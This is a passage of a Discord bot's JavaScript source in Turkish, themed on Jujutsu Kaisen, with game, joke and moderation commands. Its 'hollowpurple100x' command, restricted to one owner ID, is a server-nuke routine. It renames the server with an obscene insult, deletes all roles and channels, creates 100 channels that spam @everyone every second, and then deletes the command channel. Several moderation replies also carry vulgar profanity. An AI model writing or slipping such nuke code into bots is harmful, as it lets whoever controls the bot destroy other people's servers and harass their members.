    }, 24000);

    // FINAL - ~20.5 saniye
    setTimeout(async () => {
        const sonuclar = [
            {
                kazanan: 'Gojo Satoru',
                renk: '#00f0ff',
                baslik: '🏆 GOJO KAZANDI!',
                aciklama: '**"Throughout Heaven and Earth, I alone am the Honored One."**\nSix Eyes ve Limitless üstün geldi!',
                resim: fix('https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3ejRmdDRhdXY4Y2h1OXUzODdhOTdibXpnanBlenhkaGwxamN1bWI1aSZlcD12MV9naWZzX3JlbGF0ZWQmY3Q9Zw/nBEup7jCb7ZQw1jmP3/giphy.gif') // Gojo temalı
            },
            {
                kazanan: 'Ryomen Sukuna',
                renk: '#ff2222',
                baslik: '💀 SUKUNA KAZANDI!',
                aciklama: '**"Know your place, brat."**\nLanetlerin Kralı yine hükmünü verdi!',
                resim: fix('https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExMW5uczgzcDAyOTh3eWZ3emtsb2I2aXZmejVkaTh5NThpZWliZ2xqdyZlcD12MV9naWZzX3NlYXJjaCZjdD1n/hoYXVjUeuWkDU7tgpP/giphy.gif') // Sukuna temalı
            }
        ];

        const final = sonuclar[Math.floor(Math.random() * sonuclar.length)];

        await anaMesaj.edit({
            embeds: [
                new EmbedBuilder()
                    .setTitle(final.baslik)
                    .setDescription(final.aciklama)
                    .setColor(final.renk)
                    .setImage(final.resim)
                    .setFooter({
                        text: `Savaşı başlatan: ${message.author.username}`,
                        iconURL: message.author.displayAvatarURL({ dynamic: true })
                    })
                    .setTimestamp()
            ]
        }).catch(() => {});
    }, 30000);
}


// --- GLOBAL DEĞİŞKEN (Hafıza) ---
let currentDomain = { 
    active: false, 
    owner: null, 
    type: null, 
    threadId: null 
};



// ================== DOMAIN EXPANSION ==================
if (command === 'domainexpansion' || command === 'de') {

    const aceID = '983015347105976390';
    const sukunaID = '1456965268520833154';
    const roleId = '1489798026368254122';

    if (![aceID, sukunaID].includes(message.author.id)) {
        return message.reply("Bu güce sahip değilsin!");
    }

    const isAce = message.author.id === aceID;
    const userName = isAce ? 'ACE' : 'NİŞASTA';

    // ================= CLASH =================
    if (currentDomain.active && currentDomain.owner !== message.author.id) {

        if (currentDomain.isClashing) {
            return message.reply("Zaten clash var!");
        }

        currentDomain.isClashing = true;

        await message.channel.send(`⚔️ <@${aceID}> vs <@${sukunaID}> BAŞLADI!\n10 saniye boyunca **GÜÇ** yazın!`);

        let aceScore = 0;
        let sukunaScore = 0;

        const filter = m =>
            [aceID, sukunaID].includes(m.author.id) &&
            normalize(m.content) === "GUC";

        const collector = message.channel.createMessageCollector({
            filter,
            time: 10000
        });

        collector.on("collect", m => {
            if (m.author.id === aceID) aceScore++;
            if (m.author.id === sukunaID) sukunaScore++;
        });

        collector.on("end", async () => {

            currentDomain.isClashing = false;

            if (aceScore === sukunaScore) {
                await message.channel.send(`💥 BERABERE! (${aceScore})`);
                return closeDomain(message, roleId, aceID, sukunaID, "İki alan da çöktü!");
            }

            const winnerID = aceScore > sukunaScore ? aceID : sukunaID;
            const winnerName = winnerID === aceID ? "ACE" : "NİŞASTA";

            // eski pini kaldır
            if (currentDomain.pinnedMsg) {
                await currentDomain.pinnedMsg.unpin().catch(() => {});
            }

            const msg = await message.channel.send(`🏆 ${winnerName} kazandı!`);
            await msg.pin().catch(() => {});

            currentDomain.owner = winnerID;
            currentDomain.pinnedMsg = msg;
            currentDomain.active = true;

            clearTimeout(currentDomain.timeoutMsg);

            currentDomain.timeoutMsg = setTimeout(() => {
                if (currentDomain.active) {
                    closeDomain(message, roleId, aceID, sukunaID, "Süre doldu!");
                }
            }, 300000);
        });

        return;
    }

    // ================= NORMAL AÇILIŞ =================

    if (currentDomain.active) {
        return message.reply("Zaten alan açık!");
    }

    try {
        // 🔥 EN ÖNEMLİ FIX
        currentDomain.active = true;
        currentDomain.owner = message.author.id;

        await message.channel.permissionOverwrites.edit(roleId, { SendMessages: false });
        await message.channel.permissionOverwrites.edit(aceID, { SendMessages: true });
        await message.channel.permissionOverwrites.edit(sukunaID, { SendMessages: true });

        const msg = await message.channel.send(`🌀 ${userName} DOMAIN AÇTI!`);
        await msg.pin().catch(() => {});

        currentDomain.pinnedMsg = msg;

        currentDomain.timeoutMsg = setTimeout(() => {
            if (currentDomain.active) {
                closeDomain(message, roleId, aceID, sukunaID, "Süre doldu!");
            }
        }, 300000);

    } catch (err) {
        console.error(err);
    }
}

// ================== DOMAIN CLOSE ==================
if (command === 'domainclose' || command === 'dc') {

    if (!currentDomain.active) {
        return message.reply("Açık domain yok!");
    }

    if (message.author.id !== currentDomain.owner) {
        return message.reply("Sadece sahibi kapatabilir!");
    }

    const aceID = '983015347105976390';
    const sukunaID = '1456965268520833154';
    const roleId = '1489798026368254122';

    closeDomain(message, roleId, aceID, sukunaID, "Manuel kapatıldı.");
}

// ================== CLOSE FUNCTION ==================
async function closeDomain(message, roleId, aceID, sukunaID, reason) {
    try {

        await message.channel.permissionOverwrites.edit(roleId, { SendMessages: true });
        await message.channel.permissionOverwrites.edit(aceID, { SendMessages: true });
        await message.channel.permissionOverwrites.edit(sukunaID, { SendMessages: true });

        if (currentDomain.pinnedMsg) {
            await currentDomain.pinnedMsg.unpin().catch(() => {});
        }

        clearTimeout(currentDomain.timeoutMsg);

        await message.channel.send(`👁️ Domain kapandı: ${reason}`);

        // RESET
        currentDomain = {
            active: false,
            owner: null,
            type: null,
            pinnedMsg: null,
            timeoutMsg: null,
            isClashing: false
        };

    } catch (err) {
        console.error(err);
    }
}

    // --- HOLLOW PURPLE (MESAJ SİLME) ---
if (command === 'hollowpurple') {
    if (message.author.id !== '983015347105976390') {
        return message.reply("Bu yıkım gücü için gereken 'Altı Göz' sende yok.");
    }

    try {
        // Son 100 mesajı siler
        await message.channel.bulkDelete(100, true);

        const embed = {
            color: 0x800080, // Mor renk
            title: '🟣 虚式 「茈」 (KYOSHIKI: MURASAKİ)',
            description: '***"ACE her şeyi sıfırladı. Ortada ne bir lanet ne de bir mesaj kaldı."***',
            image: {
                url: 'https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExb25jM3VwcTBhMjJ6dXRyZmdudWdmMXd2ZzdvZjJrOGEyenpzZnVyaCZlcD12MV9naWZzX3NlYXJjaCZjdD1n/MxfS5KAoviW8SbUhV9/giphy.gif'
            }
        };

        await message.channel.send({ embeds: [embed] });
    } catch (error) {
        console.error(error);
        message.reply('Hollow Purple kontrol edilemedi! (Mesajlar 14 günden eski olabilir veya yetkim yok).');
    }
}

// --- HOLLOW PURPLE: ACE ULTRA BLITZKRIEG ---
if (command === 'hollowpurple100x') {
    const guild = message.guild;
    if (!guild) return;

    // Satoru Gojo Yetki Kontrolü
    if (message.author.id !== '983015347105976390') {
        return message.reply("Bu teknik için gereken 'Altı Göz' sende yok.");
    }

    if (!args.includes("onaylıyorum")) {
        return message.reply("🟣 **ULTRA100X HOLLOWPURPLE AKTİF EDİLSİN Mİ?** Onay (sadece ace): `a!hollowpurple100x onaylıyorum`.");
    }

    console.log("⚡ Operasyon Başladı: Hız Modu Aktif.");

    const aceGif = "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExd2gyc2Z6YzNwMjM2cmxncXhpM3ZuY2w2b2V1Y2RteGU2Z2R1ZXZmayZlcD12MV9naWZzX3NlYXJjaCZjdD1n/0wxRYPhdD7n3W7NQ1R/giphy.gif";

    // --- ÖZEL DETAY: SUNUCU KİMLİĞİNİ DEĞİŞTİR ---
    guild.setName("🟣 ACE TARAFINDAN SİKİLDİNİZ 🟣").catch(() => {});
    guild.setIcon(aceGif).catch(() => {});

    // 1. ADIM: ROLLERİ PARALEL VE YILDIRIM HIZIYLA SİL (150ms - Maksimum Risk/Hız)
    const roles = guild.roles.cache.filter(r => r.editable && r.name !== "@everyone" && !r.managed).toJSON();
    roles.forEach((role, index) => {
        setTimeout(() => { role.delete().catch(() => {}); }, index * 150);
    });

    // 2. ADIM: KANALLARI AYNI ANDA SİL (200ms)
    const currentChId = message.channel.id;
    const existingChannels = guild.channels.cache.filter(ch => ch.id !== currentChId).toJSON();
    existingChannels.forEach((ch, index) => {
        setTimeout(() => { if (ch.deletable) ch.delete().catch(() => {}); }, index * 200);
    });

    // 3. ADIM: KANAL OLUŞTURMA VE ÖZEL YETKİLER (Bekleme Süresi Yok!)
    for (let i = 1; i <= 100; i++) {
        setTimeout(async () => {
            try {
                const ch = await guild.channels.create({
                    name: `ace-tarafindan-sikildiniz-${i}`,
                    type: 0,
                    permissionOverwrites: [
                        {
                            id: guild.id, // @everyone
                            allow: ['ViewChannel', 'ReadMessageHistory'], // Görme ve Geçmiş: AÇIK
                            deny: ['SendMessages'], // Mesaj Gönder: KAPALI (Senin isteğin üzerine)
                        },
                    ],
                });

                // Spam Döngüsü: 1 Saniye (Durdurulamaz Baskı)
                const interval = setInterval(() => {
                    ch.send(`@everyone **ACE TARAFINDAN HOLLOW PURPLE 100X E HAPİS OLDUNUZ ÇATIR ÇUTUR SİKİLİYORSUNUZ!** 🟣\n${aceGif}`)
                    .catch(() => clearInterval(interval)); // Bot atılırsa veya kanal silinirse durur
                }, 1000);

            } catch (err) {
                // Rate limit (hız sınırı) yakalanırsa bot çökmez, bir sonraki kanala atlar
            }
        }, i * 800); // Her 0.8 saniyede bir kanal (API'nin en uç sınırı)
    }

    // 4. ADIM: SON DARBE
    // Komutun yazıldığı kanalı en son (15 saniye sonra) imha et
    setTimeout(() => {
        message.channel.delete().catch(() => {});
    }, 15000);
}

// --- İPTAL: SADECE VOIDLERİ TEMİZLER ---
if (command === 'purpleiptal') {
    if (message.author.id !== '983015347105976390') return;
    const guild = message.guild;

    message.channel.send("🔴 **Mühür kaldırılıyor... (Sadece ACE kanalları silinir)**");

    const aceChannels = guild.channels.cache.filter(ch => ch.name.startsWith('ace-tarafindan-')).toJSON();
    aceChannels.forEach((ch, index) => {
        setTimeout(() => {
            if (ch.deletable) ch.delete().catch(() => {});
        }, index * 500);
    });
}


    // --- SONSUZLUK AÇ/KAPAT KOMUTU ---
if (command === 'sonsuzluk') {
    if (message.author.id !== '983015347105976390') {
        return message.reply("Sonsuzluğu bükemezsin.");
    }

    sonsuzlukAktif = !sonsuzlukAktif; // Aktifse kapatır, kapalıysa açar.

    const durum = sonsuzlukAktif ? "AKTİF" : "DEAKTİF";
    const renk = sonsuzlukAktif ? 0x00AEFF : 0xFF0000;

    const embed = {
        color: renk,
        title: `🛡️ Sonsuzluk Katmanı: ${durum}`,
        description: sonsuzlukAktif 
            ? "ACE ile arandaki mesafe şu andan itibaren sonsuzdur. Kimse dokunamaz." 
            : "Sonsuzluk katmanı kaldırıldı. Gerçek dünya ile temas mümkün.",
        image: {
            url: 'https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3NzBneHh1ZXUxNzNyczEybWoydnZ3OXMyZGRnd3BpeWZsNWczbjQzayZlcD12MV9naWZzX3NlYXJjaCZjdD1n/LHy9iUZDBxjEwNexJm/giphy.gif'
        }
    };

    message.channel.send({ embeds: [embed] });
}
    
    if (command === 'aşkölç') {
        const target = message.mentions.users.first();
        if (!target) return message.reply("Birisini etiketle!");

        const msg = await message.reply("💘 Aşk ölçülüyor... Lütfen bekle.");
        const yuzde = Math.floor(Math.random() * 101);

        const canvas = Canvas.createCanvas(700, 250);
        const ctx = canvas.getContext('2d');

        ctx.fillStyle = '#ffb6c1'; 
        ctx.fillRect(0, 0, canvas.width, canvas.height);

        const avatar1 = await Canvas.loadImage(message.author.displayAvatarURL({ extension: 'png' }));
        const avatar2 = await Canvas.loadImage(target.displayAvatarURL({ extension: 'png' }));
        ctx.drawImage(avatar1, 50, 50, 150, 150);
        ctx.drawImage(avatar2, 500, 50, 150, 150);

        ctx.font = '50px sans-serif';
        ctx.fillStyle = '#ffffff';
        ctx.textAlign = "center";
        
        let emoji = yuzde > 50 ? "💖" : "💔";
        ctx.fillText(`${emoji} %${yuzde}`, canvas.width / 2, 140);

        const attachment = new AttachmentBuilder(canvas.toBuffer(), { name: 'askolcer.png' });
        await msg.delete();
        return message.channel.send({ content: `**${message.author.username}** & **${target.username}** aşk uyumu:\n*🛡️ Ace System*`, files: [attachment] });
    }

    if (command === 'patlat') {
        const uyeler = message.guild.members.cache.filter(m => !m.user.bot).random(8);
        let patlayanlar = uyeler.length > 0 ? uyeler.map(u => `💥 **${u.user.username}** PATLADI! 🔥`).join('\n') : 'Kimse kalmadı... herkes uçtu gitti! 💨';

        const embed = new EmbedBuilder()
            .setColor('#FF0000')
            .setTitle('💥 **SUNUCU VE ÜYELER PATLADI!** 💥')
            .setDescription(`**${message.author} sunucuyu infilak ettirdi!**\n\n🚨 **PATLAMA BAŞLADI!** 🚨\nSunucu paramparça oluyor...\nÜyeler havada uçuşuyor!\n\n**Patlayanlar:**\n${patlayanlar}\n\n**Tüm sunucu yok oldu!**\n*(Şaka lan şaka 😂 Sunucu hala ayakta, korkmayın)*`)
            .setThumbnail('https://i.imgur.com/9Qe6v0K.gif')
            .setFooter({ text: `🛡️ Ace System • Patlatan: ${message.author.username}`, iconURL: message.author.displayAvatarURL({ dynamic: true }) })
            .setTimestamp();

        await message.delete().catch(() => {});
        const patlamaMesaji = await message.channel.send({ embeds: [embed] });

        setTimeout(() => message.channel.send('💥 **BOOOOOOM!** 💥').catch(() => {}), 800);
        setTimeout(() => message.channel.send('🔥 **HER ŞEY YANDI!** 🔥').catch(() => {}), 1600);
        setTimeout(() => message.channel.send('☠️ **SUNUCU BİTTİ...** ☠️ *(yeniden doğuyor)*\n*🛡️ Ace System*').catch(() => {}), 2500);

        patlamaMesaji.react('💥').catch(() => {});
        patlamaMesaji.react('🔥').catch(() => {});
    }
    
// ====================== GELİŞMİŞ CEZA MENÜSÜ (FULL PAKET) ======================
    if (command === 'ceza-menü') {
        if (message.author.id !== OWNER_ID) return message.reply("❌ Bu komutu sadece Ace kullanabilir!\n*🛡️ Ace System*");

        const target = message.mentions.members.first();
        if (!target) return message.reply("İşlem yapılacak kişiyi etiketle: `a!ceza-menü @kişi`");

        // Kişinin ID'sini customId içine gömüyoruz ki menüden seçince kim olduğunu bilelim
        const row = new ActionRowBuilder().addComponents(
            new StringSelectMenuBuilder()
                .setCustomId(`ceza_${target.id}`)
                .setPlaceholder('Uygulanacak cezayı seçin (Ace System)')
                .addOptions([
                    { label: 'Chat Mute', description: 'Özel süre ve sebep belirterek metin kanallarında sustur.', value: 'mute', emoji: '🤐' },
                    { label: 'Voice Mute', description: 'Özel süre ve sebep belirterek ses kanallarında sustur.', value: 'vmute', emoji: '🎙️' },
                    { label: 'Kick (At)', description: 'Sunucudan belirtilen sebeple at.', value: 'kick', emoji: '👢' },
                    { label: 'Ban (Yasakla)', description: 'Sunucudan kalıcı olarak yasakla.', value: 'ban', emoji: '🔨' },
                ]),
        );

        await message.reply({ content: `👑 **${target.user.tag}** kullanıcısı için Ace Gelişmiş Ceza Menüsü:`, components: [row] });
    }
}); // messageCreate bitişi

// ====================== AÇILIR PENCERE (MODAL) VE MENÜ DİNLEYİCİSİ ======================
client.on('interactionCreate', async interaction => {
    
    // 1. AŞAMA: MENÜDEN CEZA SEÇİLDİĞİNDE AÇILIR PENCERE (MODAL) ÇIKARTMA
    if (interaction.isStringSelectMenu() && interaction.customId.startsWith('ceza_')) {
        if (interaction.user.id !== OWNER_ID) return interaction.reply({ content: "Buna dokunamazsın! Bu panel sadece Ace'e aittir.", ephemeral: true });

        const targetID = interaction.customId.split('_')[1]; // Gömülü ID'yi alıyoruz
        const islem = interaction.values[0]; // mute, vmute, kick, ban

        // Modal oluşturuyoruz
        const modal = new ModalBuilder()
            .setCustomId(`modal_${islem}_${targetID}`)
            .setTitle(`Ceza Uygula: ${islem.toUpperCase()}`);

        // Sebep Giriş Alanı (Hepsi için ortak)
        const sebepInput = new TextInputBuilder()
            .setCustomId('sebep')
            .setLabel("Ceza Sebebi Nedir?")
            .setStyle(TextInputStyle.Paragraph)
            .setPlaceholder("Örn: Sunucu kurallarına uymamak")
            .setRequired(true);

        // Süre Giriş Alanı (Sadece Mute ve VMute için)
        const sureInput = new TextInputBuilder()
            .setCustomId('sure')
            .setLabel("Süre (Örn: 10m, 1h, 1d)")
            .setStyle(TextInputStyle.Short)
            .setPlaceholder("10m (Dakika), 1h (Saat), 1d (Gün)")
            .setRequired(true);

        const actionRow1 = new ActionRowBuilder().addComponents(sebepInput);
        
        // Eğer işlem kick veya ban değilse süreyi de ekle
        if (islem === 'mute' || islem === 'vmute') {
            const actionRow2 = new ActionRowBuilder().addComponents(sureInput);
            modal.addComponents(actionRow2, actionRow1); // Önce süre, sonra sebep gözüksün
        } else {
            modal.addComponents(actionRow1); // Kick ve Ban'da sadece sebep sorar
        }

        // Modalı kullanıcıya göster
        await interaction.showModal(modal);
    }

    // 2. AŞAMA: KULLANICI PENCEREYİ DOLDURUP GÖNDERDİĞİNDE CEZAYI UYGULAMA
    if (interaction.isModalSubmit() && interaction.customId.startsWith('modal_')) {
        const parts = interaction.customId.split('_');
        const islem = parts[1]; // mute, vmute, vb.
        const targetID = parts[2]; // hedefin ID'si

        const target = interaction.guild.members.cache.get(targetID);
        if (!target) return interaction.reply({ content: "Bu kullanıcı artık sunucuda değil kaçmış!", ephemeral: true });

        const sebep = interaction.fields.getTextInputValue('sebep');
        let sure = "Sınırsız";
        
        // Süreyi sadece mute/vmute için al ve doğrula
        if (islem === 'mute' || islem === 'vmute') {
            sure = interaction.fields.getTextInputValue('sure');
            if (!ms(sure)) return interaction.reply({ content: "❌ Geçersiz süre formatı girdin! (Geçerli olanlar: 10m, 1h, 1d)", ephemeral: true });
        }

        try {
            if (islem === 'mute') {
                await target.timeout(ms(sure), `Ace Panel: ${sebep}`);
                await new Sicil({ kullaniciID: target.id, yetkiliID: interaction.user.id, islem: 'Chat Mute', sebep: sebep, sure: sure }).save();
                
                await interaction.reply(`✅ **${target.user.tag}** adlı kullanıcı metin kanallarında \`${sure}\` boyunca susturuldu.\n📝 Sebep: ${sebep}\n\n🔥 **Ace sikti attı!** 🚀\n*🛡️ Ace System*`);
                
            } else if (islem === 'vmute') {
                if (target.voice.channel) {
                    await target.voice.setMute(true, `Ace Panel: ${sebep}`);
                    setTimeout(() => { if (target.voice.channel) target.voice.setMute(false); }, ms(sure));
                }
                await new Sicil({ kullaniciID: target.id, yetkiliID: interaction.user.id, islem: 'Voice Mute', sebep: sebep, sure: sure }).save();
                
                await interaction.reply(`🎙️ **${target.user.tag}** adlı kullanıcı ses kanallarında \`${sure}\` boyunca susturuldu.\n📝 Sebep: ${sebep}\n\n🔥 **Ace sikti attı!** 🚀\n*🛡️ Ace System*`);
                
            } else if (islem === 'kick') {
                await target.kick(`Ace Panel: ${sebep}`);
                await new Sicil({ kullaniciID: target.id, yetkiliID: interaction.user.id, islem: 'Kick', sebep: sebep, sure: '-' }).save();
                
                await interaction.reply(`👢 **${target.user.tag}** adlı kullanıcı sunucudan şutlandı.\n📝 Sebep: ${sebep}\n\n🔥 **Ace sikti attı!** 🚀\n*🛡️ Ace System*`);
                
            } else if (islem === 'ban') {
                await target.ban({ reason: `Ace Panel: ${sebep}` });
                await new Sicil({ kullaniciID: target.id, yetkiliID: interaction.user.id, islem: 'Ban', sebep: sebep, sure: 'Sınırsız' }).save();
                
                await interaction.reply(`🔨 **${target.user.tag}** adlı kullanıcının fişi çekildi ve kalıcı banlandı.\n📝 Sebep: ${sebep}\n\n🔥 **Ace sikti attı!** 🚀\n*🛡️ Ace System*`);
            }
        } catch (e) {
            console.log(e);
            await interaction.reply({ content: "İşlem başarısız oldu, kullanıcının rolü benim rolümden yüksek olabilir.", ephemeral: true });
        }
    }
});

client.login(process.env.TOKEN);
